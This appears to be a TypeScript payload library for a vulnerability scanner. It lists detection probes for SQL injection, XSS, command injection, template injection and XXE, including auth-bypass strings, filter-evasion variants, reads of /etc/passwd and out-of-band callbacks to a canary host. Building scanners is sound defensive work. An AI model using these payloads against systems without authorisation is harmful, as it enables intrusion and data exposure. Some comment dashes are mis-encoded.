/**
 * Injection variant libraries (v0.20.0) Ã¢â‚¬â€ SQLi, XSS, command injection,
 * SSTI, XXE. Curated, reviewed payload lists. Every payload is a DETECTION
 * probe: read-only or benign-canary. Destructive SQL (DROP/DELETE/UPDATE/
 * INSERT/ALTER), destructive commands, and XXE billion-laughs shapes are
 * excluded by policy Ã¢â‚¬â€ they don't exist in these lists.
 */
import type { VariantClass, VariantPayload } from "./types.js";

function v(kind: VariantClass, payload: string, whatItTests: string): VariantPayload {
  return { kind, payload, whatItTests };
}

/** SQL injection Ã¢â‚¬â€ tautologies, unions, time-based, stacked, encodings. */
export const SQLI_VARIANTS: VariantPayload[] = [
  v("sqli", "' OR '1'='1", "classic tautology, single-quote context"),
  v("sqli", "' OR '1'='1' -- ", "tautology with line comment"),
  v("sqli", '" OR "1"="1', "double-quote context"),
  v("sqli", "' OR 1=1 -- ", "numeric-tolerant tautology"),
  v("sqli", "' UNION SELECT NULL-- ", "union probe, 1 column"),
  v("sqli", "' UNION SELECT NULL,NULL-- ", "union probe, 2 columns"),
  v("sqli", "' UNION SELECT NULL,NULL,NULL-- ", "union probe, 3 columns"),
  v("sqli", "' AND SLEEP(5)-- ", "time-based blind, MySQL"),
  v("sqli", "'; WAITFOR DELAY '0:0:5'-- ", "time-based blind, MSSQL stacked"),
  v("sqli", "' || (SELECT pg_sleep(5))-- ", "time-based blind, Postgres"),
  v("sqli", "1' AND '1'='1", "inline true condition (differential baseline)"),
  v("sqli", "1' AND '1'='2", "inline false condition (differential pair)"),
  v("sqli", "%27%20OR%20%271%27%3D%271", "URL-encoded tautology"),
  v("sqli", "'/**/OR/**/'1'='1", "inline-comment whitespace bypass"),
  v("sqli", "' OR 'a'='a'/*", "block-comment truncation"),
  v("sqli", "admin'-- ", "auth-bypass shape, comment"),
  v("sqli", "' OR SLEEP(5)#", "hash-comment time-based, MySQL"),
  v("sqli", "1;SELECT SLEEP(5)", "stacked query time-based"),
  v("sqli", "'\"", "quote-breaker probe (error differential)"),
  v("sqli", "' AND 1=CONVERT(int,(SELECT @@version))-- ", "error-based probe, MSSQL (detection only)"),
  v("sqli", "'||(SELECT SLEEP(2))||'", "second-order stored time shape (fires on reuse)"),
  v("sqli", "{\"$gt\": \"\"}", "NoSQL operator injection, MongoDB $gt"),
  v("sqli", "{\"username\": {\"$ne\": null}}", "NoSQL auth bypass shape, MongoDB $ne"),
  v("sqli", "' UNION SELECT NULL FROM DUAL-- ", "Oracle DUAL union probe (1 column)"),
  v("sqli", "'||CHAR(65,66,67)||'", "string-concat operator probe (SQLite/MySQL)"),
  v("sqli", "%2527%2520OR%25201%253D1", "double URL-encoded tautology (WAF bypass)"),
  v("sqli", "'%09OR%09'1'='1", "tab-whitespace bypass"),
  v("sqli", "' AND CAST('a' AS INT)=1-- ", "error-based CAST probe (detection only)"),
];

/** Cross-site scripting Ã¢â‚¬â€ contexts, event handlers, encoding bypasses. */
export const XSS_VARIANTS: VariantPayload[] = [
  v("xss", "<script>alert(1)</script>", "classic script context"),
  v("xss", "<img src=x onerror=alert(1)>", "event-handler vector"),
  v("xss", "<svg onload=alert(1)>", "svg onload vector"),
  v("xss", '"><script>alert(1)</script>', "attribute breakout, double-quote"),
  v("xss", "'\"><img src=x onerror=alert(1)>", "quote breakout, single+double"),
  v("xss", "<body onload=alert(1)>", "body onload vector"),
  v("xss", "<details open ontoggle=alert(1)>", "modern HTML vector"),
  v("xss", "<input onfocus=alert(1) autofocus>", "input autofocus vector"),
  v("xss", "<marquee onstart=alert(1)>", "marquee vector"),
  v("xss", "</textarea><script>alert(1)</script>", "textarea breakout"),
  v("xss", "%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded script"),
  v("xss", "<ScRiPt>alert(1)</ScRiPt>", "case-variation bypass"),
  v("xss", "<scr<script>ipt>alert(1)</scr<script>ipt>", "nested-tag filter bypass"),
  v("xss", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "HTML-entity encoded handler"),
  v("xss", "javascript:alert(1)", "URL scheme context"),
  v("xss", '<a href="javascript:alert(1)">x</a>', "href javascript context"),
  v("xss", "<script>alert(1)</script >", "trailing-space filter bypass"),
  v("xss", "<script>alert(String.fromCharCode(88,83,83))</script>", "string-encoding evasion"),
  v("xss", "&lt;script&gt;alert(1)&lt;/script&gt;", "double-encoding probe"),
  v("xss", "<img src=\"x\" onerror=\"alert(1)\">", "quoted-attribute handler"),
  v("xss", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "mutation XSS via noscript parsing"),
  v("xss", "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=alert(1)>", "SVG foreignObject namespace breakout"),
  v("xss", "${alert(1)}", "template-literal injection probe"),
  v("xss", "<form id=\"x\"><input name=\"config\">", "DOM clobbering via id/name collision"),
  v("xss", "</style><img src=x onerror=alert(1)>", "style-context breakout"),
  v("xss", "<template><img src=x onerror=alert(1)></template>", "template/shadow-DOM content probe"),
  v("xss", "<math><mi href=\"javascript:alert(1)\">x</mi></math>", "MathML namespace href vector"),
];

/**
 * OS command injection Ã¢â‚¬â€ benign commands only (id/echo/sleep). The agent
 * substitutes its canary marker for VARIANT where a marker echo proves
 * execution. No destructive commands exist in this list.
 */
export const CMDI_VARIANTS: VariantPayload[] = [
  v("cmdi", ";id", "semicolon separator"),
  v("cmdi", "|id", "pipe separator"),
  v("cmdi", "||id", "or-separator"),
  v("cmdi", "&&id", "and-separator"),
  v("cmdi", "$(id)", "dollar-paren substitution"),
  v("cmdi", "`id`", "backtick substitution"),
  v("cmdi", "; id", "semicolon with space"),
  v("cmdi", "%3Bid", "URL-encoded semicolon"),
  v("cmdi", ";echo VARIANT", "semicolon echo-canary"),
  v("cmdi", "|echo VARIANT", "pipe echo-canary"),
  v("cmdi", "a;id", "trailing-context separator"),
  v("cmdi", "$(echo VARIANT)", "substitution echo-canary"),
  v("cmdi", ";sleep 5", "time-based detection, benign"),
  v("cmdi", "%0aid", "newline separator, encoded"),
  v("cmdi", "& id &", "background separator"),
  v("cmdi", "|sleep 2", "time-based via pipe, short sleep"),
  v("cmdi", "||sleep 2", "or-separator time-based, short sleep"),
  v("cmdi", "& echo VARIANT", "Windows cmd separator with echo-canary"),
  v("cmdi", "%COMSPEC% /c echo VARIANT", "Windows COMSPEC env var execution"),
  v("cmdi", ";echo${IFS}VARIANT", "IFS whitespace filter bypass"),
  v("cmdi", ";nslookup {{CANARY}}", "DNS canary out-of-band detection"),
  v("cmdi", "`echo VARIANT`", "backtick echo-canary substitution"),
];

/** Server-side template injection Ã¢â‚¬â€ detection markers only, no sandbox escapes. */
export const SSTI_VARIANTS: VariantPayload[] = [
  v("ssti", "{{7*7}}", "Jinja2/Twig math detection"),
  v("ssti", "${7*7}", "Freemarker/Velocity detection"),
  v("ssti", "#{7*7}", "Pug/Slim detection"),
  v("ssti", "<%= 7*7 %>", "EJS/ERB detection"),
  v("ssti", "{{7*'7'}}", "string-concat probe"),
  v("ssti", "${{7*7}}", "double-brace variant"),
  v("ssti", "{{config}}", "Jinja2 config object probe (read-only)"),
  v("ssti", "{{self}}", "template self-reference probe"),
  v("ssti", "*{7*7}", "Spring expression detection"),
  v("ssti", "<%=7*7%>", "ERB no-space variant"),
  v("ssti", "%7B%7B7*7%7D%7D", "URL-encoded braces"),
  v("ssti", "[[${7*7}]]", "Thymeleaf detection"),
  v("ssti", "{7*7}", "Smarty single-brace detection"),
  v("ssti", "{{ 7*7 }}", "whitespace-tolerant Jinja2/Twig/Blade variant"),
  v("ssti", "${7*'7'}", "Freemarker string-concat probe"),
  v("ssti", "#set($x=7*7)$x", "Velocity set-directive math detection"),
  v("ssti", "{{7*7}}${7*7}", "polyglot Jinja2+Freemarker detection"),
  v("ssti", "<%= 7*7 %>${7*7}", "polyglot ERB+Freemarker detection"),
  v("ssti", "{{7*7}}#{7*7}", "polyglot Jinja2+Pug detection"),
  v("ssti", "{{7*7", "unclosed-brace error-based context probe"),
];

/**
 * XXE Ã¢â‚¬â€ detection shapes only. `{{CANARY}}` = operator canary host
 * placeholder (agent substitutes). No billion-laughs / quadratic-blowup
 * shapes Ã¢â‚¬â€ those are DoS and excluded by policy.
 */
export const XXE_VARIANTS: VariantPayload[] = [
  v("xxe", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>', "classic external entity, read-only file probe"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{{CANARY}}/xxe">]><r>&xxe;</r>', "blind OOB to canary host"),
  v("xxe", '<!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{{CANARY}}/xxe"> %xxe;]>', "parameter-entity OOB"),
  v("xxe", '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent-{{CANARY}}">]>', "error-based entity probe"),
  v("xxe", '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></r>', "XInclude file probe"),
  v("xxe", '<!DOCTYPE r [<!ENTITY xxe "vulnerable">]><r>&xxe;</r>', "internal entity (no expansion attack)"),
  v("xxe", '<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "encoding-declaration variant"),
  v("xxe", '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE s [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></svg>', "SVG-embedded XXE shape"),
  v("xxe", '<!DOCTYPE r [<!ENTITY % pe SYSTEM "file:///etc/hostname"> %pe;]><r/>', "external parameter entity via internal subset"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Envelope><soap:Body><r>&xxe;</r></soap:Body></soap:Envelope>', "SOAP envelope XXE shape"),
  v("xxe", '<svg><!DOCTYPE s [<!ENTITY xxe "svg-probe">]><text>&xxe;</text></svg>', "SVG internal-entity shape (no file read)"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE Types [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><Types>&xxe;</Types>', "OOXML content-types XXE shape"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///xxe-probe-{{CANARY}}/">]><r>&xxe;</r>', "error-based via unreadable file URI"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://{{CANARY}}/evil.dtd"><r>probe</r>', "blind OOB via external DTD reference"),
  v("xxe", '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{{CANARY}}/xi" parse="text"/></r>', "XInclude blind OOB to canary"),
  v("xxe", '<?xml version="1.0"?><!DOCTYPE r PUBLIC "-//TEST//EN" "file:///etc/hostname"><r>probe</r>', "external ID (PUBLIC) file probe"),
];
